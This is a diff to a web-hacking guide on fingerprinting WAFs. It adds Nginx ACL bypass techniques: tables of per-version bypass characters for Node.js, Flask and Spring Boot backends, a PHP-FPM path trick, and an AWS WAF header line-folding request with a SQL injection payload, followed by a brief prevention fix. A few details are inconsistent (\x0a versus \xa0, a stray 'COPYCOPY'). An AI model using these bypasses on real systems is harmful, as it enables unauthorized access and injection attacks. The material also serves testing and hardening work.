@@ -25,7 +25,7 @@ To identify WAFs, we need to (dummy) provoke it.
 | ASP.NET Generic | &bull; **Detectability:** Easy<br> &bull; **Detection:** Response headers may contain `X-ASPNET-Version` header value.<br> **Blocked response page content may contain:** <br>&bull;`This generic 403 error means that the authenticated user is not authorized to use the requested resource.`<br> &bull;`Error Code 0x00000000<` keyword. |
 | BIG-IP ASM | &bull; **Detectability:** Moderate<br> &bull; **Detection:** <br> Response headers may contain `BigIP` or `F5` keyword value. <br> Response header fields may contain `X-WA-Info` header. <br> Response headers might have jumbled `X-Cnection` field value. | 
 | Cloudflare | &bull; **Detectability:** Easy<br> &bull; **Detection:** <br> Response headers might have `cf-ray` field value.<br> `Server` header field has value `cloudflare`.<br> `Set-Cookie` response headers have `__cfuid=` cookie field.<br> Page content might have `Attention Required!` or `Cloudflare Ray ID:`.<br> Page content may contain `DDoS protection by Cloudflareas` text.<br> You may encounter `CLOUDFLARE_ERROR_500S_BOX` upon hitting invalid URLs. |
-| FortiWeb | &bull; **Detectability:** Moderate <br> &bull; **Detection:** <br> Response headers contain `FORTIWAFSID=` on malicious requests. <br> Response headers contain cookei name `cookiesession1=` <br>**Blocked response page contains:** <br> Reference to `.fgd_icon` image icon. <br> `Server Unavailable!` as heading. <br> `Server unavailable. Please visit later.` as text.|
+| FortiWeb | &bull; **Detectability:** Moderate <br> &bull; **Detection:** <br> Response headers contain `FORTIWAFSID=` on malicious requests. <br> Response headers contain cookie name `cookiesession1=` <br>**Blocked response page contains:** <br> Reference to `.fgd_icon` image icon. <br> `Server Unavailable!` as heading. <br> `Server unavailable. Please visit later.` as text.|
 
 
 
@@ -345,54 +345,104 @@ Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
+# Bypassing Nginx ACL Rules
+Nginx restriction example:
+```bash
+location = /admin {
+    deny all;
+}
+
+location = /admin/ {
+    deny all;
+}
+```
+## NodeJS
+![nodejs](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/8bd4e562-49e4-426f-aa27-353e9288b9cc)
+
+* As Nginx includes the character \xa0 as part of the pathname, the ACL rule for the /admin URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;
+* When the URI /admin\x0a is received by the Node.js server, the character \xa0 will be removed, allowing successful retrieval of the /admin endpoint.
+
+
+| Nginx Version | Node.js Bypass Characters |
+| --- | --- |
+| 1.22.0 | `\xA0` |
+| 1.21.6 | `\xA0` |
+| 1.20.2 | `\xA0`, `\x09`, `\x0C` |
+| 1.18.0 | `\xA0`, `\x09`, `\x0C` |
+| 1.16.1 | `\xA0`, `\x09`, `\x0C` |
+
+## Flask
+Flask removes the characters `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B`, and `\x09` from the URL path, but NGINX doesn't.
+
+![flask](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/bf3267d0-9869-4bbf-a327-87fd7e5a101a)
+
+| Nginx Version | Flask Bypass Characters |
+| --- | --- |
+| 1.22.0 | `\x85`, `\xA0` |
+| 1.21.6 | `\x85`, `\xA0` |
+| 1.20.2 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
+| 1.18.0 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
+| 1.16.1 | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
+
+
+## Spring Boot
+Below, you will find a demonstration of how ACL protection can be circumvented by adding the character \x09 or  at the end of the pathname:
+
+![spring](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/415e6a60-2be7-4af0-8513-e27cf8df2329)
+
+| Nginx Version | Spring Boot Bypass Characters |
+| --- | --- |
+| 1.22.0 | `;` |
+| 1.21.6 | `;` |
+| 1.20.2 | `\x09`, ; |
+| 1.18.0 | `\x09`, `;` |
+| 1.16.1 | `\x09`, `;` |
+
+
+## PHP-FPM
+Let's consider the following Nginx FPM configuration:
+```bash
+location = /admin.php {
+    deny all;
+}
+
+location ~ \.php$ {
+    include snippets/fastcgi-php.conf;
+    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
+}
+```
+
+It's possible to bypass it accessing /admin.php/index.php:
+
+![php](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/24ef2f4b-1cf4-46e7-975b-ef0135043326)
+
+
+## How to prevent
+To prevent these issues, you must use the ~ expression Instead of the = expression on Nginx ACL rules, for example:
+
+COPYCOPY
+
+```bash
+location ~* ^/admin {
+    deny all;
+}
+```
+
+## Bypassing AWS WAF ACL With Line Folding
+It's possible to bypass AWS WAF protection in a HTTP header by using the following syntax where the AWS WAF won't understand X-Query header contains a sql injection payload while the node server behind will:
+
+```html
+GET / HTTP/1.1\r\n
+Host: target.com\r\n
+X-Query: Value\r\n
+\t' or '1'='1' -- \r\n
+Connection: close\r\n
+\r\n
+```
+
+* [References](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
+
+
 ## Tools
 * [GoTestWAF](https://github.com/wallarm/gotestwaf) - A tool to test a WAF's detection logic and bypasses
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
